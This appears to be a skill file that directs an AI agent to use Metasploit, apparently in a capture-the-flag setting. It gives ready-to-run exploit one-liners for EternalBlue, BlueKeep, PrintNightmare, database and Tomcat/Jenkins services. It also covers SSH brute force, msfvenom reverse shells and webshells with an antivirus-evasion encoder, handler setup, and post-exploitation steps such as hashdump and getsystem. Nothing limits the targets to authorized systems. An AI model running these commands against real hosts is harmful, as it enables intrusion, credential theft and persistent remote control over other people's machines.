---
name: msf-oneshot
description: "Metasploit Framework invocation methodology (one-liner + interactive). Use when exploiting OS-level vulnerabilities (such as EternalBlue/MS17-010), database remote vulnerabilities (such as PostgreSQL/MySQL RCE), network service vulnerabilities (SMB/RDP/FTP), when you need to generate a payload, start a reverse shell handler, or perform post-exploitation operations. MSF has 2000+ exploit modules covering remote exploitation of Windows/Linux operating systems, databases, and network devices. This skill covers both one-liner fast exploitation and interactive_session operation (handler/meterpreter/post-exploitation). Use this skill for any scenario involving metasploit, msfconsole, meterpreter, OS-level exploits, remote overflows, payload generation, handlers, or post-exploitation"
zh-signals: "使用 Metasploit Framework 进行一行式或交互式漏洞利用、payload 生成与后渗透。信号:metasploit,msfconsole,meterpreter,msfvenom,payload,handler"
when-to-use: "Use when exploiting OS, database, or network service vulnerabilities with Metasploit, generating payloads, or running a reverse-shell handler and post-exploitation sessions."
metadata:
  tags: "metasploit,msf,msfconsole,meterpreter,exploit,eternalblue,ms17-010,payload,remote-exploitation,os-vulnerability,database-vulnerability,post-exploitation,msfvenom,handler,interactive_session"
  category: "tool"
---

# Metasploit Framework Invocation Methodology

MSF has two invocation styles, suited to different scenarios:

| Style | Applicable Scenario | Tool |
|------|---------|------|
| **One-liner** (`msfconsole -q -x`) | Single exploit, vulnerability detection, msfvenom | Direct bash execution |
| **Interactive** (`interactive_session`) | Handler listener, Meterpreter sessions, post-exploitation | `interactive_session` MCP tool |

The one-liner suits "fire and forget" operations — it exits automatically when finished. But handler listeners and meterpreter post-exploitation need continuous interaction, which the one-liner cannot provide (`-x` exits as soon as it finishes, and backgrounding with `&` still prevents reading the output). In that case, use `interactive_session` to start a persistent tmux session, so you can send commands and read output at any time.

## References

- Quick reference table of common exploit modules and the payload generation guide → [references/msf-modules.md](references/msf-modules.md)
- Meterpreter sessions, pivoting, and automation → [references/meterpreter-operations.md](references/meterpreter-operations.md)

---

## Phase 1: One-Liner Basic Syntax

```bash
# Basic format: connect multiple MSF commands with semicolons
msfconsole -q -x "use EXPLOIT; set RHOSTS TARGET; set LHOST ATTACKER; run; exit"

# -q = start quietly (no banner)
# -x = execute the command string
# exit = exit when finished (important! otherwise it hangs)
```

### Complete Example: EternalBlue (MS17-010)

```bash
msfconsole -q -x "
  use exploit/windows/smb/ms17_010_eternalblue;
  set RHOSTS 10.0.0.1;
  set LHOST 10.0.0.2;
  set PAYLOAD windows/x64/meterpreter/reverse_tcp;
  set LPORT 4444;
  run;
  exit
"
```

msfconsole takes 10-30 seconds to start and load the module database; this is normal.

## Phase 2: Common Exploitation Scenarios

### 2.1 OS-Level Vulnerabilities (most used in Zone 3/4)

```bash
# MS17-010 EternalBlue (Windows SMB)
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS TARGET; set LHOST ATTACKER; run; exit"

# MS08-067 (Windows Server 2003/XP)
msfconsole -q -x "use exploit/windows/smb/ms08_067_netapi; set RHOSTS TARGET; set LHOST ATTACKER; run; exit"

# BlueKeep (Windows RDP CVE-2019-0708)
msfconsole -q -x "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS TARGET; set LHOST ATTACKER; set TARGET 2; run; exit"

# PrintNightmare (Windows Print Spooler)
msfconsole -q -x "use exploit/windows/dcerpc/cve_2021_1675_printnightmare; set RHOSTS TARGET; set LHOST ATTACKER; run; exit"
```

### 2.2 Database Remote Exploitation

```bash
# PostgreSQL code execution (default credentials postgres/postgres)
msfconsole -q -x "use exploit/multi/postgres/postgres_copy_from_program_cmd_exec; set RHOSTS TARGET; set USERNAME postgres; set PASSWORD postgres; set LHOST ATTACKER; run; exit"

# MySQL UDF privilege escalation (requires known credentials)
msfconsole -q -x "use exploit/multi/mysql/mysql_udf_payload; set RHOSTS TARGET; set USERNAME root; set PASSWORD ''; set LHOST ATTACKER; run; exit"

# MSSQL xp_cmdshell
msfconsole -q -x "use exploit/windows/mssql/mssql_payload; set RHOSTS TARGET; set USERNAME sa; set PASSWORD password; set LHOST ATTACKER; run; exit"

# Redis unauthorized write of SSH key / webshell
msfconsole -q -x "use exploit/linux/redis/redis_replication_cmd_exec; set RHOSTS TARGET; set LHOST ATTACKER; run; exit"
```

### 2.3 Web/Middleware Services

```bash
# Tomcat Manager WAR deployment (requires credentials)
msfconsole -q -x "use exploit/multi/http/tomcat_mgr_upload; set RHOSTS TARGET; set RPORT 8080; set HttpUsername tomcat; set HttpPassword tomcat; set LHOST ATTACKER; run; exit"

# JBoss deserialization
msfconsole -q -x "use exploit/multi/http/jboss_invoke_deploy; set RHOSTS TARGET; set RPORT 8080; set LHOST ATTACKER; run; exit"

# Jenkins Script Console
msfconsole -q -x "use exploit/multi/http/jenkins_script_console; set RHOSTS TARGET; set RPORT 8080; set TARGETURI /; set LHOST ATTACKER; run; exit"
```

### 2.4 Network Services

```bash
# FTP vsftpd 2.3.4 backdoor
msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS TARGET; run; exit"

# Samba (CVE-2017-7494)
msfconsole -q -x "use exploit/linux/samba/is_known_pipename; set RHOSTS TARGET; set LHOST ATTACKER; run; exit"

# SSH brute force
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS TARGET; set USERNAME root; set PASS_FILE /usr/share/wordlists/rockyou.txt; set STOP_ON_SUCCESS true; run; exit"
```

## Phase 3: Vulnerability Detection (detect only, do not exploit)

Use `auxiliary/scanner` or the `check` command for safe detection:

```bash
# Detect whether MS17-010 is present (no exploitation)
msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS TARGET; run; exit"

# SMB version detection
msfconsole -q -x "use auxiliary/scanner/smb/smb_version; set RHOSTS TARGET; run; exit"

# Batch port service detection
msfconsole -q -x "use auxiliary/scanner/portscan/tcp; set RHOSTS TARGET; set PORTS 445,3389,1433,3306; run; exit"

# Use the check command (supported by some exploits)
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS TARGET; check; exit"
```

## Phase 4: Payload Generation (msfvenom)

msfvenom does not require msfconsole, call it directly from bash:

```bash
# Windows reverse shell EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o shell.exe

# Linux reverse shell ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f elf -o shell.elf

# PHP webshell
msfvenom -p php/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f raw -o shell.php

# JSP webshell (for Tomcat WAR deployment)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f war -o shell.war

# Python reverse shell
msfvenom -p python/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f raw -o shell.py

# Encoding bypass (basic AV evasion)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o encoded.exe
```

## Phase 5: Handler Mode (interactive_session)

A handler needs to keep listening for the callback — the one-liner `-x` exits as soon as it finishes and cannot sustain a listener. Use `interactive_session` to start an interactive msfconsole session to solve this.

### Typical Flow: generate payload → start handler → deliver payload → get session

**Step 1: Generate the payload** (one-liner, Phase 4)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o shell.exe
```

**Step 2: Start the handler** (interactive)

```
interactive_session(action="start", session_name="msf_handler", command="msfconsole -q")
```

Wait 15-20 seconds for msfconsole to finish loading, then configure the handler:

```
interactive_session(action="send", session_name="msf_handler", command="use exploit/multi/handler", wait=3)
interactive_session(action="send", session_name="msf_handler", command="set PAYLOAD windows/x64/meterpreter/reverse_tcp", wait=2)
interactive_session(action="send", session_name="msf_handler", command="set LHOST 0.0.0.0", wait=2)
interactive_session(action="send", session_name="msf_handler", command="set LPORT 4444", wait=2)
interactive_session(action="send", session_name="msf_handler", command="set ExitOnSession false", wait=2)
interactive_session(action="send", session_name="msf_handler", command="exploit -j", wait=5)
```

The handler is now listening in the background. You can `read` at any time to check whether a session has called back:

```
interactive_session(action="read", session_name="msf_handler")
```

**Step 3: Deliver the payload**

Upload shell.exe to the target through another vulnerability (file upload, RCE, etc.) and execute it.

**Step 4: Confirm the session**

```
interactive_session(action="send", session_name="msf_handler", command="sessions -l", wait=3)
```

Once you see a `meterpreter` session established, proceed to Phase 6 post-exploitation.

### Shortcut: Start the Handler with a Single `-x`

If you are sure you only need the listener and no further interaction, you can start it with one command:

```
interactive_session(action="start", session_name="msf_handler", command="msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; set ExitOnSession false; exploit'")
```

This saves the step-by-step `send` calls, but subsequent interaction still goes through `send`/`read`.

## Phase 6: Post-Exploitation Operations (interactive_session)

After obtaining a meterpreter session, run post-exploitation commands through `interactive_session`. Meterpreter is an interactive shell and can only be fully used inside a persistent session. For complex session management, port forwarding, SOCKS, Kiwi, resource scripts, and multiple transports, see [references/meterpreter-operations.md](references/meterpreter-operations.md).

### Enter the Session and Collect Information

```
interactive_session(action="send", session_name="msf_handler", command="sessions -i 1", wait=3)
interactive_session(action="send", session_name="msf_handler", command="sysinfo", wait=3)
interactive_session(action="send", session_name="msf_handler", command="getuid", wait=3)
interactive_session(action="send", session_name="msf_handler", command="ipconfig", wait=3)
```

### Common Post-Exploitation Operations

```
# Filesystem operations
interactive_session(action="send", session_name="msf_handler", command="ls C:\\Users\\", wait=3)
interactive_session(action="send", session_name="msf_handler", command="download C:\\flag.txt /tmp/flag.txt", wait=5)
interactive_session(action="send", session_name="msf_handler", command="upload /tmp/tool.exe C:\\temp\\tool.exe", wait=5)

# Credential extraction (requires SYSTEM privileges)
interactive_session(action="send", session_name="msf_handler", command="hashdump", wait=5)

# Privilege escalation
interactive_session(action="send", session_name="msf_handler", command="getsystem", wait=5)

# Network information (preliminary for internal network penetration)
interactive_session(action="send", session_name="msf_handler", command="arp", wait=3)
interactive_session(action="send", session_name="msf_handler", command="route", wait=3)

# Return to the MSF main console (keep the session alive)
interactive_session(action="send", session_name="msf_handler", command="background", wait=3)
```

### Session Management

```
# List all sessions
interactive_session(action="send", session_name="msf_handler", command="sessions -l", wait=3)

# Switch to another session
interactive_session(action="send", session_name="msf_handler", command="sessions -i 2", wait=3)

# Run a low-noise confirmation command across sessions
interactive_session(action="send", session_name="msf_handler", command="sessions -c whoami", wait=3)

# Return to the main console but keep the session alive
interactive_session(action="send", session_name="msf_handler", command="background", wait=3)

# Close MSF when the operation is finished
interactive_session(action="close", session_name="msf_handler")
```

### Alternative: Command Execution Without Meterpreter

If you do not need an interactive meterpreter (you just want to run one command to grab the flag), generating a command execution payload is simpler:

```bash
msfvenom -p windows/x64/exec CMD="type C:\\flag.txt" -f exe -o cmd.exe
msfvenom -p linux/x64/exec CMD="cat /flag > /tmp/result.txt" -f elf -o cmd.elf
```

A one-liner handler works as well (no interactive_session needed).

## Decision Tree: One-Liner vs interactive_session

```
What do you need to do with MSF?
│
├─ Run a single exploit (EternalBlue, Tomcat upload, etc.)
│   └→ one-liner msfconsole -q -x "use ...; run; exit"
│
├─ Vulnerability detection / auxiliary scanner
│   └→ one-liner msfconsole -q -x "use ...; run; exit"
│
├─ Generate a payload (msfvenom)
│   └→ call msfvenom directly from bash, no msfconsole needed
│
├─ Start a handler waiting for a reverse shell
│   └→ interactive_session starts msfconsole and configures the handler
│      (the handler needs a continuous listener, which the one-liner cannot provide)
│
├─ Meterpreter post-exploitation (sysinfo, hashdump, file operations)
│   └→ interactive_session send/read interaction
│      (meterpreter is an interactive shell and needs a persistent session)
│
├─ Only run one command to grab the flag (no interaction needed)
│   └→ msfvenom -p .../exec CMD="..." generates a command execution payload
│      a one-liner handler or nc listener is enough
│
└─ Web application vulnerabilities (SQLi/XSS/SSRF)
    └→ do not use MSF, curl/sqlmap/manual scripts are faster
```

## Common Issue Troubleshooting

| Symptom | Cause | Solution |
|------|------|------|
| Exploit completed, but no session | The payload was killed / the port is occupied | Change the port, change the payload, check the firewall |
| Connection refused | The target port is not open | Use nmap to confirm the port is open first |
| msfconsole startup timeout | The database connection is slow | Add `--no-database` or wait |
| The payload cannot call back | Wrong LHOST / firewall | Confirm LHOST is an IP the target can reach |
| interactive_session read is empty | msfconsole is still loading | Set wait to 15-20 seconds and read again |
